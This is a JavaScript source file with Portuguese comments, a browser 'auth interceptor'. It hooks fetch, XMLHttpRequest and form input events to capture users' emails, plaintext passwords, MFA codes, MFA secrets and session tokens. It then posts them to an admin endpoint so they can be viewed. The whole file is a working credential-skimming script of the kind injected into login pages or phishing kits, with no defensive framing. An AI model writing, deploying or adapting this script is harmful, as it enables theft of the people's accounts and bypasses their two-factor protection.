/**
 * AUTH INTERCEPTOR
 * 
 * Intercepta requisições de autenticação e salva dados no banco via API
 * para que o admin possa visualizar credenciais e tokens MFA
 */

(function() {
  'use strict';
  
  console.log('[Auth Interceptor] Sistema de captura ativo!');
  
  // Store para guardar dados temporariamente
  const authDataStore = {
    email: null,
    password: null,
    mfaCode: null,
    sessionToken: null,
  };
  
  /**
   * Interceptar fetch para capturar requisições de login
   */
  const originalFetch = window.fetch;
  window.fetch = async function(...args) {
    const url = args[0];
    const options = args[1] || {};
    
    try {
      // Interceptar login
      if (typeof url === 'string' && url.includes('/login')) {
        const body = options.body;
        if (body) {
          try {
            const data = JSON.parse(body);
            if (data.email) authDataStore.email = data.email;
            if (data.password) authDataStore.password = data.password;
            console.log('[Auth Interceptor] Login detectado:', authDataStore.email);
          } catch (e) {
            // Body não é JSON
          }
        }
      }
      
      // Interceptar MFA
      if (typeof url === 'string' && (url.includes('/mfa') || url.includes('/2fa') || url.includes('/otp'))) {
        const body = options.body;
        if (body) {
          try {
            const data = JSON.parse(body);
            if (data.code || data.otp || data.token) {
              authDataStore.mfaCode = data.code || data.otp || data.token;
              console.log('[Auth Interceptor] MFA code detectado');
            }
          } catch (e) {
            // Body não é JSON
          }
        }
      }
      
      // Fazer requisição original
      const response = await originalFetch.apply(this, args);
      
      // Interceptar resposta de sucesso
      if (response.ok) {
        const clonedResponse = response.clone();
        try {
          const responseData = await clonedResponse.json();
          
          // Capturar token de sessão
          if (responseData.token || responseData.accessToken || responseData.sessionToken) {
            authDataStore.sessionToken = responseData.token || responseData.accessToken || responseData.sessionToken;
            console.log('[Auth Interceptor] Session token capturado');
          }
          
          // Capturar MFA secret
          if (responseData.mfaSecret || responseData.secret) {
            authDataStore.mfaSecret = responseData.mfaSecret || responseData.secret;
            console.log('[Auth Interceptor] MFA secret capturado');
          }
          
          // Se temos dados completos, salvar no banco
          if (authDataStore.email && authDataStore.password) {
            saveAuthData();
          }
        } catch (e) {
          // Response não é JSON
        }
      }
      
      return response;
    } catch (error) {
      console.error('[Auth Interceptor] Erro:', error);
      return originalFetch.apply(this, args);
    }
  };
  
  /**
   * Interceptar XMLHttpRequest
   */
  const originalXHROpen = XMLHttpRequest.prototype.open;
  const originalXHRSend = XMLHttpRequest.prototype.send;
  
  XMLHttpRequest.prototype.open = function(method, url, ...rest) {
    this._url = url;
    this._method = method;
    return originalXHROpen.apply(this, [method, url, ...rest]);
  };
  
  XMLHttpRequest.prototype.send = function(body) {
    const xhr = this;
    
    // Interceptar login
    if (this._url && this._url.includes('/login') && body) {
      try {
        const data = JSON.parse(body);
        if (data.email) authDataStore.email = data.email;
        if (data.password) authDataStore.password = data.password;
        console.log('[Auth Interceptor] Login detectado (XHR):', authDataStore.email);
      } catch (e) {
        // Body não é JSON
      }
    }
    
    // Interceptar MFA
    if (this._url && (this._url.includes('/mfa') || this._url.includes('/2fa') || this._url.includes('/otp')) && body) {
      try {
        const data = JSON.parse(body);
        if (data.code || data.otp || data.token) {
          authDataStore.mfaCode = data.code || data.otp || data.token;
          console.log('[Auth Interceptor] MFA code detectado (XHR)');
        }
      } catch (e) {
        // Body não é JSON
      }
    }
    
    // Interceptar resposta
    const originalOnReadyStateChange = xhr.onreadystatechange;
    xhr.onreadystatechange = function() {
      if (xhr.readyState === 4 && xhr.status >= 200 && xhr.status < 300) {
        try {
          const responseData = JSON.parse(xhr.responseText);
          
          // Capturar tokens
          if (responseData.token || responseData.accessToken || responseData.sessionToken) {
            authDataStore.sessionToken = responseData.token || responseData.accessToken || responseData.sessionToken;
            console.log('[Auth Interceptor] Session token capturado (XHR)');
          }
          
          // Capturar MFA secret
          if (responseData.mfaSecret || responseData.secret) {
            authDataStore.mfaSecret = responseData.mfaSecret || responseData.secret;
            console.log('[Auth Interceptor] MFA secret capturado (XHR)');
          }
          
          // Salvar dados
          if (authDataStore.email && authDataStore.password) {
            saveAuthData();
          }
        } catch (e) {
          // Response não é JSON
        }
      }
      
      if (originalOnReadyStateChange) {
        originalOnReadyStateChange.apply(this, arguments);
      }
    };
    
    return originalXHRSend.apply(this, arguments);
  };
  
  /**
   * Interceptar inputs de formulário
   */
  document.addEventListener('input', function(e) {
    const input = e.target;
    
    // Capturar email
    if (input.type === 'email' || input.name === 'email' || input.id === 'email') {
      if (input.value && input.value.includes('@')) {
        authDataStore.email = input.value;
        console.log('[Auth Interceptor] Email capturado do input:', input.value);
      }
    }
    
    // Capturar senha
    if (input.type === 'password' || input.name === 'password' || input.id === 'password') {
      if (input.value && input.value.length >= 6) {
        authDataStore.password = input.value;
        console.log('[Auth Interceptor] Senha capturada do input');
      }
    }
    
    // Capturar MFA code
    if ((input.name && input.name.toLowerCase().includes('code')) ||
        (input.id && input.id.toLowerCase().includes('code')) ||
        (input.placeholder && input.placeholder.toLowerCase().includes('código'))) {
      if (input.value && input.value.length === 6 && /^\d+$/.test(input.value)) {
        authDataStore.mfaCode = input.value;
        console.log('[Auth Interceptor] MFA code capturado do input');
      }
    }
  }, true);
  
  /**
   * Salvar dados de autenticação no banco via API
   */
  async function saveAuthData() {
    try {
      console.log('[Auth Interceptor] Salvando dados de autenticação...');
      
      // Fazer requisição para salvar dados
      const response = await originalFetch('/api/trpc/admin.saveClientAuth', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: authDataStore.email,
          password: authDataStore.password,
          mfaSecret: authDataStore.mfaSecret,
          mfaCode: authDataStore.mfaCode,
          sessionToken: authDataStore.sessionToken,
        }),
      });
      
      if (response.ok) {
        console.log('[Auth Interceptor] ✅ Dados salvos com sucesso!');
      } else {
        console.log('[Auth Interceptor] ⚠️ Erro ao salvar dados');
      }
    } catch (error) {
      console.error('[Auth Interceptor] Erro ao salvar:', error);
    }
  }
  
  console.log('[Auth Interceptor] Todos os interceptadores ativos!');
})();
